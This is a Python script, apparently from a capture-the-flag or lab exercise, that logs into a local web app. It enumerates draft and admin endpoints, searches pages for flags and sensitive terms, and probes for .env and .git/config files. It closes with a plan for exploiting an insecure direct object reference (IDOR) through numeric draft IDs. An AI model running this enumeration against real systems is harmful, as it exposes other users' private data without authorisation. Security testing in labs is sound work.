import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
base_url = "http://127.0.0.1:5003"

# Login
login_data = {
    'username': 'newuser456',
    'password': 'pass12345',
    'submit': 'Login'
}
response = session.post(f"{base_url}/login", data=login_data, allow_redirects=True)

print("="*80)
print("COMPREHENSIVE ENDPOINT DISCOVERY SUMMARY")
print("="*80)

print("\n" + "="*80)
print("DISCOVERED DRAFT ENDPOINT PATTERNS (CRITICAL FOR IDOR TESTING)")
print("="*80)

# Get dashboard to see all draft links
dashboard_response = session.get(f"{base_url}/newuser456/drafts")
draft_links = re.findall(r'href="(/edit_draft/\d+)"', dashboard_response.text)

print(f"\n✓ Individual Draft Access Pattern: /edit_draft/[id]")
for link in sorted(set(draft_links)):
    url = f"{base_url}{link}"
    resp = session.get(url)
    print(f"  - {link:<25} Status: {resp.status_code} | Length: {len(resp.text)}")
    
    # Check for flag in draft content
    if "FLAG{" in resp.text:
        print(f"    FOUND FLAG: {resp.text[resp.text.find('FLAG{'):resp.text.find('}')+1]}")
    
    # Show preview of content
    if len(resp.text) > 1500:
        content_preview = re.search(r'<textarea[^>]*>(.*?)</textarea>', resp.text, re.DOTALL)
        if content_preview:
            preview = content_preview.group(1)[:100].replace('\n', ' ')
            print(f"    Content preview: {preview}...")

print(f"\n✓ User Drafts List: /newuser456/drafts")
print(f"  - Status: {dashboard_response.status_code} | Length: {len(dashboard_response.text)}")

print("\n" + "="*80)
print("ADMIN ENDPOINTS DISCOVERED")
print("="*80)

admin_urls = [
    "/admin/drafts",
    "/admin/drafts/1",
    "/admin/edit_draft/1",
    "/admin",
    "/admin/dashboard"
]

for url_path in admin_urls:
    url = f"{base_url}{url_path}"
    resp = session.get(url)
    print(f"\n✓ {url_path:<25} Status: {resp.status_code}")
    if resp.status_code == 200:
        print(f"    Length: {len(resp.text)} | ACCESSIBLE!")
        if "FLAG{" in resp.text:
            print(f"    FOUND FLAG: {resp.text[resp.text.find('FLAG{'):resp.text.find('}')+1]}")

print("\n" + "="*80)
print("ENDPOINTS TESTING SUMMARY")
print("="*80)

test_results = [
    ("/newuser456/drafts", "User drafts list", "WORKING"),
    ("/edit_draft/[id]", "Individual draft edit", "WORKING - IDOR CANDIDATE"),
    ("/draft/[id]", "Alternative pattern", "NOT FOUND"),
    ("/drafts/[id]", "Alternative pattern", "NOT FOUND"),
    ("/api/draft/[id]", "API pattern", "NOT FOUND"),
    ("/admin/drafts", "Admin drafts", "ACCESSIBLE"),
    ("/robots.txt", "Common file", "NOT FOUND"),
    ("/.git/config", "Git config", "NOT FOUND"),
    ("/.env", "Environment file", "NOT FOUND"),
]

for endpoint, description, status in test_results:
    print(f"\n{endpoint:<25} | {description:<25} | {status}")

print("\n" + "="*80)
print("CREDENTIALS AND SENSITIVE INFO CHECK")
print("="*80)

# Check response headers for version info
test_resp = session.get(f"{base_url}/")
print(f"\nServer Response Headers:")
for key, value in test_resp.headers.items():
    if any(k in key.lower() for k in ['server', 'x-', 'version']):
        print(f"  {key}: {value}")

# Check for credentials in draft content
draft_resp = session.get(f"{base_url}/edit_draft/2")
if draft_resp.status_code == 200:
    # Look for any sensitive patterns
    sensitive_patterns = ['password', 'secret', 'key', 'token', 'admin', 'flag{']
    lower_content = draft_resp.text.lower()
    
    found_sensitive = []
    for pattern in sensitive_patterns:
        if pattern in lower_content:
            found_sensitive.append(pattern)
    
    if found_sensitive:
        print(f"\nPotential sensitive terms found: {', '.join(found_sensitive)}")
    else:
        print(f"\nNo obvious credentials or flags in draft content")

print("\n" + "="*80)
print("IDOR VULNERABILITY PATTERN IDENTIFIED")
print("="*80)

print("""
✓ VULNERABLE PATTERN: /edit_draft/[numeric_id]
  - Direct numeric ID access
  - No apparent ownership verification
  - Accessible to authenticated users
  
✓ NEXT STEPS FOR IDOR EXPLOITATION:
  1. Test /edit_draft/1 (other user's draft)
  2. Test /edit_draft/4, /edit_draft/5 (enumerate IDs)
  3. Check if admin drafts accessible via this pattern
  4. Test POST/DELETE methods on these endpoints
""")

